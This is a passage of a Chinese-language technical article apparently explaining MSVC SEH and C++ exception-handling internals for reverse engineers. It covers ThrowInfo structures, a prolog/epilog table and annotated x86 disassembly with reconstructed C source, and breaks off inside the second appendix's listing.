<p>前面说过，不同于 SEH，C++ 每一个函数中的异常处理内存布局都不相同。编译器不仅会在 进/出 <code>try</code> 语句块的时候改变状态值，在创建/销毁一个对象的时候状态值也会做出相应改变。这样一来，异常被触发的时候就可以知道哪一个对象应该被栈展开而销毁。并且，我们还可以通过检查相关状态变化和 <code>try</code> 语句块处理句柄的返回地址来最终恢复 <code>try</code> 语句块的边界（详见 <strong>附录2</strong>）。</p>
<h2 id="抛出-C-异常"><a href="#抛出-C-异常" class="headerlink" title="抛出 C++ 异常"></a>抛出 C++ 异常</h2><p>C++ 中的 <code>throw</code> 表达式在底层会转换为对 <code>_CxxThrowException()</code> 的调用，这个调用会以特征码 <code>0xE06D7363</code>（<code>&#39;msc&#39;|0xE0000000</code>) 抛出一个 Win32 异常（即 SEH 异常）。SEH 异常的自定义参数里有异常对象及其对应的 <code>ThrowInfo</code> 结构体对象，其中 <code>ThrowInfo</code> 结构描述了被抛出来的异常的类型，异常处理句柄可以拿此类型与 <code>catch</code> 块中的期望异常类型做匹配检索。下面是 <code>ThrowInfo</code> 的结构定义：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> ThrowInfo &#123;</div><div class="line">    <span class="comment">// 0x01: const, 0x02: volatile</span></div><div class="line">    DWORD attributes;</div><div class="line"></div><div class="line">    <span class="comment">// exception destructor</span></div><div class="line">    <span class="keyword">void</span> (*pmfnUnwind)();</div><div class="line"></div><div class="line">    <span class="comment">// forward compatibility handler</span></div><div class="line">    <span class="keyword">int</span> (*pForwardCompat)();</div><div class="line"></div><div class="line">    <span class="comment">// list of types that can catch this exception.</span></div><div class="line">    <span class="comment">// i.e. the actual type and all its ancestors.</span></div><div class="line">    CatchableTypeArray* pCatchableTypeArray;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> CatchableTypeArray &#123;</div><div class="line">    <span class="comment">// number of entries in the following array</span></div><div class="line">    <span class="keyword">int</span> nCatchableTypes;</div><div class="line">    CatchableType* arrayOfCatchableTypes[<span class="number">0</span>];</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>其中，<code>CatchableType</code> 定义了可以 <code>catch</code> 这种异常的类型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> CatchableType &#123;</div><div class="line">    <span class="comment">// 0x01: simple type (can be copied by memmove), 0x02: can be caught by reference only, 0x04: has virtual bases</span></div><div class="line">    DWORD properties;</div><div class="line"></div><div class="line">    <span class="comment">// see above</span></div><div class="line">    TypeDescriptor* pType;</div><div class="line"></div><div class="line">    <span class="comment">// how to cast the thrown object to this type</span></div><div class="line">    PMD thisDisplacement;</div><div class="line"></div><div class="line">    <span class="comment">// object size</span></div><div class="line">    <span class="keyword">int</span> sizeOrOffset;</div><div class="line"></div><div class="line">    <span class="comment">// copy constructor address</span></div><div class="line">    <span class="keyword">void</span> (*copyFunction)();</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">// Pointer-to-member descriptor.</span></div><div class="line"><span class="keyword">struct</span> PMD &#123;</div><div class="line">    <span class="comment">// member offset</span></div><div class="line">    <span class="keyword">int</span> mdisp;</div><div class="line"></div><div class="line">    <span class="comment">// offset of the vbtable (-1 if not a virtual base)</span></div><div class="line">    <span class="keyword">int</span> pdisp;</div><div class="line"></div><div class="line">    <span class="comment">// offset to the displacement value inside the vbtable</span></div><div class="line">    <span class="keyword">int</span> vdisp;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>我们会在下一篇深入阐述这一方面的内容。</p>
<h2 id="序言-与-结语（Prologs-amp-Epilogs）"><a href="#序言-与-结语（Prologs-amp-Epilogs）" class="headerlink" title="序言 与 结语（Prologs &amp; Epilogs）"></a><strong>序言</strong> 与 <strong>结语</strong>（Prologs &amp; Epilogs）</h2><p>为了避免向函数体部分注入设置栈帧的代码，编译器通常会选择用一些<strong>序言</strong>（<strong>Prologs</strong>）和<strong>结语</strong>（<strong>epilog</strong>）函数做一些处理。不过形式多种多样，不同类型的序言或结语作用于不同的函数类型：</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Type</th>
<th>EH Cookie</th>
<th>GS Cookie</th>
<th>Catch Handlers</th>
</tr>
</thead>
<tbody>
<tr>
<td>_SEH_prolog/_SEH_epilog</td>
<td>SEH3</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>_SEH_prolog4/_SEH_epilog4 S</td>
<td>EH4</td>
<td>+</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>_SEH_prolog4_GS/_SEH_epilog4_GS</td>
<td>SEH4</td>
<td>+</td>
<td>+</td>
<td></td>
</tr>
<tr>
<td>_EH_prolog</td>
<td>C++ EH</td>
<td>-</td>
<td>-</td>
<td>+/-</td>
</tr>
<tr>
<td>_EH_prolog3/_EH_epilog3</td>
<td>C++ EH</td>
<td>+</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>_EH_prolog3_catch/_EH_epilog3</td>
<td>C++ EH</td>
<td>+</td>
<td>-</td>
<td>+</td>
</tr>
<tr>
<td>_EH_prolog3_GS/_EH_epilog3_GS</td>
<td>C++ EH</td>
<td>+</td>
<td>+</td>
<td>-</td>
</tr>
<tr>
<td>_EH_prolog3_catch_GS/_EH_epilog3_catch_GS</td>
<td>C++ EH</td>
<td>+</td>
<td>+</td>
<td>+</td>
</tr>
</tbody>
</table>
<h2 id="SEH2"><a href="#SEH2" class="headerlink" title="SEH2"></a>SEH2</h2><p>当然，这个在早期的 <code>MSVC1.xx</code> 中才会用到（从 <code>crtdll.dll</code> 中导出），在一些运行在旧版 NT 上的程序中会碰到。其内存布局如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">Saved edi</div><div class="line">Saved esi</div><div class="line">Saved ebx</div><div class="line">Next SEH frame</div><div class="line">Current SEH handler (__except_handler2)</div><div class="line">Pointer to the scopetable</div><div class="line">Try level</div><div class="line">Saved ebp (of this function)</div><div class="line">Exception pointers</div><div class="line">Local variables</div><div class="line">Saved ESP</div><div class="line">Local variables</div><div class="line">Callee EBP</div><div class="line">Return address</div><div class="line">Function arguments</div></pre></td></tr></table></figure>
<h2 id="附录-1：SEH-程序示例"><a href="#附录-1：SEH-程序示例" class="headerlink" title="附录 1：SEH 程序示例"></a>附录 1：SEH 程序示例</h2><p>参考以下反汇编出来的结果：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line">func1           proc <span class="built_in">near</span></div><div class="line"></div><div class="line">_excCode        = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">28h</span></div><div class="line">buf             = <span class="built_in">byte</span> <span class="built_in">ptr</span> -<span class="number">24h</span></div><div class="line">_saved_esp      = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">18h</span></div><div class="line">_exception_info = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">14h</span></div><div class="line">_next           = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">10h</span></div><div class="line">_handler        = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">0Ch</span></div><div class="line">_scopetable     = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">8</span></div><div class="line">_trylevel       = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">4</span></div><div class="line"><span class="keyword">str</span>             = <span class="built_in">dword</span> <span class="built_in">ptr</span>  <span class="number">8</span></div><div class="line"></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">ebp</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></div><div class="line">    <span class="keyword">push</span>    -<span class="number">1</span></div><div class="line">    <span class="keyword">push</span>    offset _func1_scopetable</div><div class="line">    <span class="keyword">push</span>    offset _except_handler3</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, large <span class="built_in">fs</span>:<span class="number">0</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     large <span class="built_in">fs</span>:<span class="number">0</span>, <span class="built_in">esp</span></div><div class="line">    <span class="keyword">add</span>     <span class="built_in">esp</span>, -<span class="number">18h</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">ebx</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">esi</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">edi</span></div><div class="line"></div><div class="line"><span class="comment">; --- end of prolog ---</span></div><div class="line"></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_trylevel], <span class="number">0</span> <span class="comment">;trylevel -1 -&gt; 0: beginning of try block 0</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_trylevel], <span class="number">1</span> <span class="comment">;trylevel 0 -&gt; 1: beginning of try block 1</span></div><div class="line">    <span class="keyword">mov</span>     large <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:<span class="number">123</span>, <span class="number">456</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_trylevel], <span class="number">0</span> <span class="comment">;trylevel 1 -&gt; 0: end of try block 1</span></div><div class="line">    <span class="keyword">jmp</span>     short _endoftry1</div><div class="line"><span class="symbol"></span></div><div class="line">_func1_filter1:   <span class="comment">; __except() filter of try block 1</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+_exception_info]</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ecx</span>+EXCEPTION_POINTERS.ExceptionRecord]</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">edx</span>+EXCEPTION_RECORD.ExceptionCode]</div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_excCode], <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+_excCode]</div><div class="line">    <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></div><div class="line">    <span class="keyword">cmp</span>     <span class="built_in">ecx</span>, EXCEPTION_ACCESS_VIOLATION</div><div class="line">    <span class="keyword">setz</span>    <span class="built_in">al</span></div><div class="line">    <span class="keyword">retn</span></div><div class="line"><span class="symbol"></span></div><div class="line">_func1_handler1:   <span class="comment">; beginning of handler for try block 1</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">esp</span>, [<span class="built_in">ebp</span>+_saved_esp]</div><div class="line">    <span class="keyword">push</span>    offset aAccessViolatio <span class="comment">; "Access violation"</span></div><div class="line">    <span class="keyword">call</span>    _printf</div><div class="line">    <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_trylevel], <span class="number">0</span> <span class="comment">;trylevel 1 -&gt; 0: end of try block 1</span></div><div class="line"><span class="symbol"></span></div><div class="line">_endoftry1:</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+<span class="keyword">str</span>]</div><div class="line">    <span class="keyword">push</span>    <span class="built_in">edx</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+buf]</div><div class="line">    <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">    <span class="keyword">call</span>    _strcpy</div><div class="line">    <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">8</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_trylevel], -<span class="number">1</span> <span class="comment">; trylevel 0 -&gt; -1: end of try block 0</span></div><div class="line">    <span class="keyword">call</span>    _func1_handler0     <span class="comment">; execute __finally of try block 0</span></div><div class="line">    <span class="keyword">jmp</span>     short _endoftry0</div><div class="line"><span class="symbol"></span></div><div class="line">_func1_handler0:   <span class="comment">; __finally handler of try block 0</span></div><div class="line">    <span class="keyword">push</span>    offset aInFinally <span class="comment">; "in finally"</span></div><div class="line">    <span class="keyword">call</span>    _puts</div><div class="line">    <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></div><div class="line">    <span class="keyword">retn</span></div><div class="line"><span class="symbol"></span></div><div class="line">_endoftry0:</div><div class="line">  <span class="comment">; --- epilog ---</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+_next]</div><div class="line">    <span class="keyword">mov</span>     large <span class="built_in">fs</span>:<span class="number">0</span>, <span class="built_in">ecx</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">edi</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">esi</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">ebx</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">esp</span>, <span class="built_in">ebp</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">ebp</span></div><div class="line">    <span class="keyword">retn</span></div><div class="line">func1 endp</div><div class="line"></div><div class="line">_func1_scopetable</div><div class="line">    <span class="comment">;try block 0</span></div><div class="line">    <span class="built_in">dd</span> -<span class="number">1</span>                      <span class="comment">;EnclosingLevel</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                       <span class="comment">;FilterFunc</span></div><div class="line">    <span class="built_in">dd</span> offset _func1_handler0  <span class="comment">;HandlerFunc</span></div><div class="line"></div><div class="line">    <span class="comment">;try block 1</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                       <span class="comment">;EnclosingLevel</span></div><div class="line">    <span class="built_in">dd</span> offset _func1_filter1   <span class="comment">;FilterFunc</span></div><div class="line">    <span class="built_in">dd</span> offset _func1_handler1  <span class="comment">;HandlerFunc</span></div></pre></td></tr></table></figure>
<p>注意，上面的 <code>0</code> 号 <code>try</code> 块并没有过滤器，所以它的处理句柄是 <code>__finally{}</code> 语句块。<code>try</code> 块 <code>1</code> 的 <code>EnclosingLevel</code> 是 <code>0</code>，所以它被 <code>0</code> 号 <code>try</code> 块所闭合。由此以来，我们可以大概构造出上面程序的大概结构：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span> <span class="params">(<span class="keyword">char</span>* str)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf[<span class="number">12</span>];</div><div class="line">  __try <span class="comment">// try block 0</span></div><div class="line">  &#123;</div><div class="line">     __try <span class="comment">// try block 1</span></div><div class="line">     &#123;</div><div class="line">       *(<span class="keyword">int</span>*)<span class="number">123</span>=<span class="number">456</span>;</div><div class="line">     &#125;</div><div class="line">     __except(GetExceptCode() == EXCEPTION_ACCESS_VIOLATION)</div><div class="line">     &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Access violation"</span>);</div><div class="line">     &#125;</div><div class="line">     <span class="built_in">strcpy</span>(buf,str);</div><div class="line">  &#125;</div><div class="line">  __finally</div><div class="line">  &#123;</div><div class="line">     <span class="built_in">puts</span>(<span class="string">"in finally"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="附录-2：带-SEH-异常的-C-程序示例"><a href="#附录-2：带-SEH-异常的-C-程序示例" class="headerlink" title="附录 2：带 SEH 异常的 C++ 程序示例"></a>附录 2：带 SEH 异常的 C++ 程序示例</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div></pre></td><td class="code"><pre><div class="line">func1           proc <span class="built_in">near</span></div><div class="line"></div><div class="line">_a1             = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">24h</span></div><div class="line">_exc            = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">20h</span></div><div class="line">e               = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">1Ch</span></div><div class="line">a2              = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">18h</span></div><div class="line">a1              = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">14h</span></div><div class="line">_saved_esp      = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">10h</span></div><div class="line">_next           = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">0Ch</span></div><div class="line">_handler        = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">8</span></div><div class="line">_state          = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">4</span></div><div class="line"></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">ebp</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></div><div class="line">    <span class="keyword">push</span>    <span class="number">0FFFFFFFFh</span></div><div class="line">    <span class="keyword">push</span>    offset func1_ehhandler</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, large <span class="built_in">fs</span>:<span class="number">0</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     large <span class="built_in">fs</span>:<span class="number">0</span>, <span class="built_in">esp</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">ecx</span></div><div class="line">    <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">14h</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">ebx</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">esi</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">edi</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_saved_esp], <span class="built_in">esp</span></div><div class="line"></div><div class="line">    <span class="comment">; --- end of prolog ---</span></div><div class="line"></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+a1]</div><div class="line">    <span class="keyword">call</span>    A::A(void)</div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_state], <span class="number">0</span>          <span class="comment">; state -1 -&gt; 0: a1 constructed</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+a1], <span class="number">1</span>              <span class="comment">; a1.m1 = 1</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+_state], <span class="number">1</span> <span class="comment">; state 0 -&gt; 1: try &#123;</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+a2]</div><div class="line">    <span class="keyword">call</span>    A::A(void)</div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_a1], <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+_state], <span class="number">2</span> <span class="comment">; state 2: a2 constructed</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+a2], <span class="number">2</span>              <span class="comment">; a2.m1 = 2</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+a1]</div><div class="line">    <span class="keyword">cmp</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+a2]            <span class="comment">; a1.m1 == a2.m1?</span></div><div class="line">    <span class="keyword">jnz</span>     short loc_40109F</div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_exc], offset aAbc  <span class="comment">; _exc = "abc"</span></div><div class="line">    <span class="keyword">push</span>    offset __TI1?PAD         <span class="comment">; char *</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+_exc]</div><div class="line">    <span class="keyword">push</span>    <span class="built_in">ecx</span></div><div class="line">    <span class="keyword">call</span>    _CxxThrowException       <span class="comment">; throw "abc";</span></div><div class="line"><span class="symbol"></span></div><div class="line">loc_40109F:</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+_state], <span class="number">1</span> <span class="comment">; state 2 -&gt; 1: destruct a2</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+a2]</div><div class="line">    <span class="keyword">call</span>    A::~A(void)</div><div class="line">    <span class="keyword">jmp</span>     short func1_try0end</div><div class="line"></div><div class="line"><span class="comment">; catch (char * e)</span></div><div class="line"><span class="symbol">func1_try0handler_pchar:</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+e]</div><div class="line">    <span class="keyword">push</span>    <span class="built_in">edx</span></div><div class="line">    <span class="keyword">push</span>    offset aCaughtS <span class="comment">; "Caught %s\n"</span></div><div class="line">    <span class="keyword">call</span>    <span class="built_in">ds</span>:printf       <span class="comment">;</span></div><div class="line">    <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">8</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset func1_try0end</div><div class="line">    <span class="keyword">retn</span></div><div class="line"></div><div class="line"><span class="comment">; catch (...)</span></div><div class="line"><span class="symbol">func1_try0handler_ellipsis:</span></div><div class="line">    <span class="keyword">push</span>    offset aCaught___ <span class="comment">; "Caught ...\n"</span></div><div class="line">    <span class="keyword">call</span>    <span class="built_in">ds</span>:printf</div><div class="line">    <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset func1_try0end</div><div class="line">    <span class="keyword">retn</span></div><div class="line"><span class="symbol"></span></div><div class="line">func1_try0end:</div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_state], <span class="number">0</span>          <span class="comment">; state 1 -&gt; 0: &#125;//try</span></div><div class="line">    <span class="keyword">push</span>    offset aAfterTry <span class="comment">; "after try\n"</span></div><div class="line">    <span class="keyword">call</span>    <span class="built_in">ds</span>:printf</div><div class="line">    <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_state], -<span class="number">1</span>         <span class="comment">; state 0 -&gt; -1: destruct a1</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+a1]</div><div class="line">    <span class="keyword">call</span>    A::~A(void)</div><div class="line">    <span class="comment">; --- epilog ---</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+_next]</div><div class="line">    <span class="keyword">mov</span>     large <span class="built_in">fs</span>:<span class="number">0</span>, <span class="built_in">ecx</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">edi</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">esi</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">ebx</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">esp</span>, <span class="built_in">ebp</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">ebp</span></div><div class="line">    <span class="keyword">retn</span></div><div class="line">func1           endp</div><div class="line"></div><div class="line">func1_ehhandler proc <span class="built_in">near</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset func1_funcinfo</div><div class="line">    <span class="keyword">jmp</span>     __CxxFrameHandler</div><div class="line">func1_ehhandler endp</div><div class="line"></div><div class="line">func1_funcinfo</div><div class="line">    <span class="built_in">dd</span> <span class="number">19930520h</span>            <span class="comment">; magicNumber</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">4</span>                    <span class="comment">; maxState</span></div><div class="line">    <span class="built_in">dd</span> offset func1_unwindmap <span class="comment">; pUnwindMap</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">1</span>                    <span class="comment">; nTryBlocks</span></div><div class="line">    <span 